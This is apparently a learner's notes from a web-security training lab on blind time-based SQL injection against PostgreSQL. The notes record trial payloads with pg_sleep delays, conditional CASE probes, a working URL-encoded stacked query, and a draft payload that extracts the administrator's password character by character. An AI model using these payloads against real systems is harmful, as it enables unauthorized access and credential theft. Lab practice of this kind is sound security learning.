# The Lab
# Goal: Log in as Admin

# Preliminary Work
- Given: no different responses for errors or no rows or custom welcome messages returned
    - thus, conditional error payloads are not applicable
- Do conditional payloads with time delays

# Conditional Time Delay Exploitation
- Testing version of SQL with unconditional time delays
    - PostgreSQL: fake'||pg_sleep(10)-- (:white_check_mark:)
- Testing conditional time delays
    - PostgreSQL: fake'||SELECT CASE WHEN (1=2) THEN pg_sleep(10) ELSE pg_sleep(0) END--
        - Loads normally? (:white_check_mark:)
    - Delays?
        - fake'||SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END-- (:x:)
        - fake'||SELECT+CASE+WHEN+(1=1)+THEN+ pg_sleep(10)+ELSE+pg_sleep(0)+END-- (:x:)
        - fake'||SELECT+CASE+WHEN+(1=1)+THEN+ pg_sleep(10)+ELSE+pg_sleep(0)+END# (:x:)
        - fake'+SELECT+CASE+WHEN+(1=1)+THEN+ pg_sleep(10)+ELSE+pg_sleep(0)+END-- (:x:)
        - fake'+SELECT+CASE+WHEN+(1=1)+THEN+ pg_sleep(10)+ELSE+pg_sleep(0)+END# (:x:)
        - fake';SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END-- (:x:)
        - fake';SELECT+CASE+WHEN+(1=1)+THEN+ pg_sleep(10)+ELSE+pg_sleep(0)+END-- (:x:)
        - fake';SELECT+CASE+WHEN+(1=1)+THEN+ pg_sleep(10)+ELSE+pg_sleep(0)+END# (:x:)
        - fake';SELECT+CASE+WHEN+(1=1)+THEN+ pg_sleep(10)+ELSE+pg_sleep(0)+END-- (:x:)
        - fake';SELECT+CASE+WHEN+(1=1)+THEN+ pg_sleep(10)+ELSE+pg_sleep(0)+END# (:x:)
        - Looked at solution
            - Completely forgot about URL encoding lol
                - Imagine people actually santizing input lol
            - fake'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END-- (:white_check_mark:)
                - %3B = semicolon
                - Had good idea with plus signs
- Using conditional time delays to extract password characters

# Extracting Information
- Trying: fake'%3BIF+(SELECT+COUNT(username)+FROM+users+WHERE+username+=+'administrator'+AND+SUBSTRING(password,1,1)+>+'m')+=+1+THEN+pg_sleep(10)+ELSE+pg_sleep(0)--
    - Testing to see if the expression is true? (evaluates to 1) <-- PLEASE INVESTIGATE
    - Reminders:
        - Indexing begins from 1
        - First # is index
        - Second # is number of characters after first index to include

# Observations
- '||' concantenation works for unconditional time delays ONLY
- Might try the URL encoded semicolon on previous labs that I could not solve
